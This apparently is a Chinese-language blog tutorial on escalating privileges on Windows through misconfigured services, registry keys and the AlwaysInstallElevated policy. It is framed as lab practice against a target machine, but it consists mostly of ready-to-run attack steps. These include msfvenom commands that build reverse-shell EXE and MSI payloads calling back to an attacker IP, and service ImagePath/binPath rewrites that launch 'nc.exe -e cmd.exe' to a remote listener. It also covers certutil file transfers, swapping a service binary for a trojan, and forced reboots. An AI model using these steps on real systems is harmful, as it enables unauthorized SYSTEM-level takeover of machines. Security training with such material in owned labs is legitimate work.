---
title: Windows提权3：服务配置与注册表漏洞
date: 2026-03-21 9:00:00
tags:
- 提权
- Windows
- 服务配置
- 注册表
categories:
- ISW
- Windows提权
---

本篇提权的核心思想：
==============

Windows 系统后台运行着大量“服务（Services）”。大多数第三方软件（比如杀毒软件、MySQL、各类企业软件）在安装时，都会注册一个服务，并且默认以 **`NT AUTHORITY\SYSTEM` (最高权限)** 运行。

**我们的提权逻辑只有一个：** 想办法，把这个高权限服务原本要执行的 `A.exe`，偷换成我们自己的 `木马.exe`。等服务一启动，我们的木马就会以 SYSTEM 权限运行

本篇讲述了**5个提权手法**：

一、 未引用的**服务路径** (Unquoted Service Path) （服务底层exe有空格）

二、 不安全的服务可执行文件权限 (Weak Executable Permissions) （服务底层exe可写）

三、 不安全的服务注册表配置 (Weak Service Registry Permissions) （注册表键可写 -> 可以修改服务对应的exe路径）

四、 修改服务配置 `binPath` (等号后必带空格) （可修改服务配置，变成我们自定义的服务）

五、 永远以**高权限**安装 (AlwaysInstallElevated) 

这5个手法都有一个默认前提：就是要操作的服务一定是高权限服务

查看服务权限：

```bash
sc qc "服务名"
# 看最后一行的 SERVICE_START_NAME 是不是 LocalSystem
```







# 实战手法：

一、未引用的服务路径
-----------------------------------

**⭐ 频率：极高 | 难度：低 | 经典必考**

### 原理解析

当一个服务的可执行文件路径**包含空格**，且**没有被双引号包裹**时，Windows API (`CreateProcess`) 会产生歧义。比如路径是：`C:\Program Files\My App\service.exe` Windows 在启动服务时，会按照以下顺序“猜”你想运行哪个程序：

1. `C:\Program.exe` （把 Files 当作参数）

2. `C:\Program Files\My.exe` （把 App 当作参数）

3. `C:\Program Files\My App\service.exe` （终于找对了）

**利用点**：如果我们在 `C:\` 下放一个 `Program.exe`，或者在 `C:\Program Files\` 下放一个 `My.exe`，Windows 就会以 SYSTEM 权限优先执行我们的木马

### 实战步骤

**Step 1找目标服务:**   在 CMD 中运行以下 WMI 命令，精准过滤出“自动启动”、“不在 Windows 默认目录下”、“没有双引号”的服务：

```bash
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v """
```

---

**Step 2: 验证目录/文件是否可写** 假设我们找到了目标路径：`C:\Program Files\Enterprise Software\app.exe`。我们要检查能否在 `C:\Program Files\` 下写入 `Enterprise.exe`。

```bash
icacls "C:\Program Files"
```

**如何看懂 `icacls` 结果？** 以你刚才在自己电脑上查到的 `C:\Program Files` 权限为例：

* 你看到了 `BUILTIN\Users:(RX)`

* `(RX)` 的意思是普通用户只有 **读取 (Read)** 和 **执行 (eXecute)** 权限。

* **什么时候才能提权？** 只有当你用 `icacls` 看到 `BUILTIN\Users:(W)` (写入) 或 `(M)` (修改) 或 `(F)` (完全控制) 时，漏洞才能真正被利用

---

**Step 3: 制作并放置木马 (实战具体操作)** 这里说的“木马”，其实就是一个能主动连接你 Ubuntu 的反弹 Shell 程序。

在你的 Ubuntu 攻击机上，使用 `msfvenom` 一键生成这个 `Enterprise.exe`：

* **如果靶机/服务是 64 位 (首选)**:
  
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.243.120.200 LPORT=4444 -f exe -o Enterprise.exe
  ```

* **如果靶机/服务是 32 位 (或需通用兼容)**:
  
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=10.243.120.200 LPORT=4444 -f exe -o Enterprise.exe
  ```

**payload解析：**

* **`-p` (Payload)**: 指定具体载荷。注意 `windows/x64/...` 代表 64 位，而 `windows/...`（中间没写架构）默认代表 32 位。

* **兼容性提示**: 64 位 Windows 系统可以完美运行 32 位程序，但 32 位系统无法运行 64 位程序。**在提权时，建议木马位数与被替换的服务位数保持一致。**

* **`-f exe`**: 输出格式为可执行文件。

* **`-o`**: 输出文件名。

```bash
# 尝试重启服务 
sc stop "服务名" 
sc start "服务名"
```

如果提示拒绝访问，输入 `shutdown /r /t 0` 重启靶机，服务开机自启时就会触发，这时候就是以system用户反弹的shell，拿到的就是最高权限的shell

二、 不安全的服务可执行文件权限
----------------------------------------------

**⭐ 频率：高 | 难度：低**

### 原理

路径没空格，也有双引号，非常标准。但是，管理员给这个 `.exe` 文件本身的权限设错了，普通用户有权限直接“修改”或“覆盖”这个文件。

### 实战步骤

**Step 1: 找目标服务** 通常由 WinPEAS 标红发现，或者手工用 `accesschk.exe`（Sysinternals 工具包，实战常备）查找：

- 下载**accesschk.exe**
1. 它是微软官方发布的 Sysinternals 工具包成员，杀软不会拦截它，直接用 wget 扒官方直链：
   
   * 下载 64位版：`wget https://live.sysinternals.com/accesschk64.exe -O accesschk.exe`
   
   * 下载 32位版：`wget https://live.sysinternals.com/accesschk.exe` 

2. **传到靶机的哪里**：**`C:\Windows\Temp\`** 或 **`C:\Users\Public\`**。
   
   * 用 `python3 -m http.server 80` 在 Ubuntu 开服务。
   
   * 靶机接收：`certutil.exe -urlcache -split -f "http://10.243.120.200/accesschk.exe" C:\Windows\Temp\accesschk.exe`

在 `C:\Windows\Temp\` 下执行命令：

```bash
accesschk.exe -uwcqv "Users" * /accepteula
```

这条命令是使用微软官方工具 **AccessChk** 来检查 **"Users" 用户组** 在系统上拥有**写入权限**的 **Windows 服务**（注意：这里只是服务可写(可操作),并不是exe可写）

同时为了不漏掉自启动的服务，我们需要查找所有自启动的服务

```bash
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v """
```



**Step 2: 验证文件是否可写**

```bash
icacls "C:\Program Files\SecureApp\secure_service.exe"
```

**Step 3:提权**

```bash
# 1. 备份原文件 (免得把靶机搞崩)
move "C:\Program Files\SecureApp\secure_service.exe" "secure_service.exe.bak"

# 2. 把你用 msfvenom 生成的木马放进去并重命名
copy C:\Windows\Temp\Enterprise.exe "C:\Program Files\SecureApp\secure_service.exe"

# 3. 触发
sc stop SecureService && sc start SecureService
```





## 三、 不安全的服务注册表配置 (Weak Service Registry Permissions)

**⭐ 频率：中 | 难度：中**

### 原理

Windows 所有的服务配置都存在注册表这个“大档案库”里。路径是：`HKLM\SYSTEM\CurrentControlSet\Services\<服务名>`。在这个目录下，有一个叫 `ImagePath` 的值，记录了服务的 `.exe` 在哪。如果管理员没锁好“档案室”的门（没设好注册表权限），我们就能直接进去把 `ImagePath` 涂改成我们木马的路径。

### 利用条件 (必须同时满足)

1. **目标价值**：该服务以 `LocalSystem` 运行。

2. **核心权限**：当前用户对该服务的**注册表键 (Registry Key)** 拥有写权限（通常表现为 `Full Control` 或 `Write`）。

3. **触发条件**：你有权重启该服务，或者系统可以被重启。

### 如何查看靶机是否满足条件？

使用 `accesschk` 扫描**注册表键**（注意参数是 `-k`）：

```bash
accesschk.exe /accepteula -uvwqk HKLM\SYSTEM\CurrentControlSet\Services\服务名
```

* **看回显**：如果你看到 `RW` 后面跟着你的用户名或 `Users` 组，且内容里有 `Set Value` 权限，说明可以打。

### 实战步骤

```bash
# 1. 查询确认权限 (如果是 Full Control 就可以干)
C:\Windows\Temp\accesschk.exe /accepteula -uvwqk "HKLM\SYSTEM\CurrentControlSet\Services\目标服务名"

# 2. 修改注册表 ImagePath 指向你的反弹 shell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\目标服务名" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\nc.exe 10.243.120.200 4444 -e cmd.exe" /f

# 3. 重启服务
net start 目标服务名
```

注意：如果路径中有空格，要加双引号把路径包起来，不然会报错



## 四、 Insecure Service Permissions (修改服务配置 `binPath`)

⭐ 频率：中 | 难度：高 (容易踩坑)

### 原理

你既不能替换 exe 文件，也不能改注册表。但是，你对**这个服务本身**（Service Object）拥有 `SERVICE_CHANGE_CONFIG`（修改配置）的权限。

### 实战步骤

通过 `C:\Windows\Temp\accesschk.exe -uwcqv "Users" * /accepteula` 发现你对 `daclsvc` 服务有 `SERVICE_CHANGE_CONFIG` 权限。

**警告：`sc config` 命令格式** 在 Windows 下使用 `sc config` 修改服务路径时，`binPath=` **后面必须跟一个空格**

```bash
# 错误写法 (绝对报错)： 
sc config daclsvc binPath="C:\Temp\nc.exe 10.0.0.1 4444 -e cmd" 
# 正确写法 (等号后面必须有空格)： 
sc config daclsvc binpath= "C:\Windows\Temp\nc.exe 10.243.120.200 4444 -e cmd.exe"
```

修改完成后，直接 `sc start daclsvc`，SYSTEM shell 到手。



## 五、 永远以高权限安装 (AlwaysInstallElevated)

**⭐ 频率：低 (但遇到就是送分) | 难度：极低**

### 原理

这是组策略里的一个奇葩配置。如果开启，任何普通用户双击 `.msi` 安装包，Windows 都会以 **SYSTEM** 权限去执行安装过程。

### 实战步骤

**Step 1: 验证配置 (两条命令必须都返回 0x1)** 

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Step 2: 制造恶意 MSI 包 (在你的 Ubuntu 攻击机上执行)** 

```bash
# 生成一个反弹 shell 的 msi 安装包 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.243.120.200 LPORT=4444 -f msi -o setup.msi
```

**Step 3: 传到靶机并静默安装** 

```bash
msiexec /quiet /qn /i C:\Windows\Temp\setup.msi
```

敲下回车的瞬间，你的 nc 监听窗口就会弹回 SYSTEM shell


